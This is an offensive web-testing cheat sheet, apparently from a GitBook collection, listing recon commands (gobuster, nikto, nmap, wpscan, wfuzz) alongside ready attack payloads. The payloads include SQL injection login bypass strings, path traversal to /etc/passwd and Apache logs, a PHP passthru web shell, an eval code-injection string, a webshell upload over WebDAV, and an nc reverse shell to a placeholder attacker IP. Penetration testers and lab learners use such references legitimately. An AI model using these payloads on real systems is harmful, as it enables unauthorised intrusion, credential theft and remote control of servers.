---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/web-application/basic-recon
---

# Basic Recon

## Web Application Assessment Methodology

* What does the application do?
* What language is it written in?
* What server software is the application running on?

## Web Application Enumeration

* Programming language and frameworks
* Web Server Software
* Database software
* Server Operating System

## Web Checklist

```basic
# Default Credentials
- /robots.txt
- admin/admin, admin/password, admin/machine-name, machine-name/machine-name
- Search on google for default credential of the application
- Hydra
- /Fuzz - applciation/Fuzz - index.php/fuzz
- Fuzz with extension(.txt,.conf,txt,html,php,asp,aspx,jsp,db,sql,exe,config,db
bak,cgi,ps1,py,ini,js,sh,.php,.txt,.json,.html
- SQL Bypass Auth
- Entry Point: ' '' ` ') ") `) ')) ")) `)) 
- Password Field: ' || ''==' ( No SQL Injection Payload )
- admin' or 1==1 
- ' or 1=1 -- -
- ' || 1=1 -- -
- whatweb -v
- Customize login password with array  (username=admin&password[]=)
- /index.[php,html,asp.aspx] or /randomthing-get-error
- LFI / Directory Traversal -> SSH key
- LFI / Configuration of Service File
- Checking eval() 2+2 2*2
- Checking with POST request
- WordPress Plugin vulnerable
- Check Source Code to Find Plugin install
- Looking for hostname and Zone Transfer
- ?file=/etc/passwd (absolute path)
- ?file=../../../etc/passwd - ?file=../../../../etc/passwd
- ?file=../../../../var/log/apache2/access.log
- ?file=../../../../var/www/html/index.php
```

```basic
#Success Login
- Version (Exploit-db)
- File Upload
- User privilege might change 
- Code execution directly a new post/page
- Module? Extension? Addons?
- Create own Module, extension, addone (Malicious)
- Access through CMS to sensitive database information credentaisl
- Can we schedule any system level jobs?
- Escalate to Administration privilege
- Diagnostic Tools - System Level Execute?
- Configuration File?
- Modify or Inject php code on existing file?
<?php
<pre>
passthru($_GET['cmd']);
</pre>
?>
- page=index');eval('phpinfo();');#
- page=index');eval("(system('nc 10.10.10.10 443 -e /bin/bash');");#
```

## WordPress

```basic
wpscan --url http://10.10.10.10 --enumerate ap,at,cb,dbe
```

## Gobuster

```basic
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x.php
```

* -x : specific file extension
* -k : disable check certificate error
* \--exclude-length: exclude specific length not to display
* -o: for output
* -f: add / at the end of the file
* -n: not to print specific status code
* -w: wordlist
* -t for thread

### Create loop to scan

```bash
for i in uploads dev admin test; do
gobuster dir -u http://10.10.10.10/$i -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x.php -o gobuster.$i.log
done
```

### Through Proxy

```basic
proxychains gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/common.txt -x html -t 50 --proxy socks5://127.0.0.1:8080
```

## Dirbuster

```basic
dirb http://10.10.10.10/project -u admin:password
```

## Nikto

```basic
nikto -h http://10.10.10.10
nikto -h http://10.10.10.10 -o nikto.html -Format htm
```

## Username Enum

```basic
wfuzz -c -w /usr/share/seclists/Usernames/Names/names.txt -d "usename=FUZZ&password=anything" -hs "No Account found with that username" http://10.10.10.10/login.php
```

## Curl Command

```basic
#Send HTTP GET request to each discovered directory and checking for 200 OK status
curl -I -L google.com

#send HTTP request with Header
curl -H "User-Agent: Mozilla Firefox" 10.10.10.10/secret

#Bypass Filter
curl http://10.10.10.10:13337/logs -H "X-Forwarded-For: localhost"
└─$ curl http://10.10.10.10:13337/logs?file=/etc/passwd -H "X-Forwarded-For: localhost"
└─$ curl -X POST http://10.10.10.10:13337/update -H "Content-Type: application/json" -H "X-Forwarded-For: localhost" --data '{"user":"admin","url":"http://10.10.10.10/shell"}'

#We can request with curl -d "" with no data which content-length: 0
└─$ curl -d "" -X POST http://10.10.10.10:33333/list-current-deployments
<p>Not Implemented</p>   

└─$ curl -d "" -X POST http://10.10.10.10:33333/list-running-procs 


└─$ proxychains curl -X POST --data "data=ls" -H 'X-Forwarded-For: 127.0.0.1' http://10.10.10.10/cmd.php
```

## Webdev

```basic
#Running davtest tool.
davtest -url http://10.10.10.10/webdav
davtest -auth bob:password_123 -url http://10.10.10.10/webdav

#Interact with webdav 
cadaver http://10.10.10.10/webda
put /usr/share/webshells/asp/webshell.asp
```

## Nmap

```basic
#Running http-enum nmap script to discover interesting directories.
nmap --script http-enum -sV -p 80 10.10.10.10

#Running Header script to get the IIS server header information.
nmap --script http-headers -sV -p 80 10.10.10.10

#Running http-methods script on /webdav path to discover all allowed methods
 nmap --script http-methods --script-args http-methods.url-path=/webdav/
10.10.10.10

#Running webdav scan Nmap script to identify WebDAV installations the script uses the
OPTIONS and PROPFIND methods to detect it
nmap --script http-webdav-scan --script-args http-methods.url-path=/webdav/
10.10.10.10
```
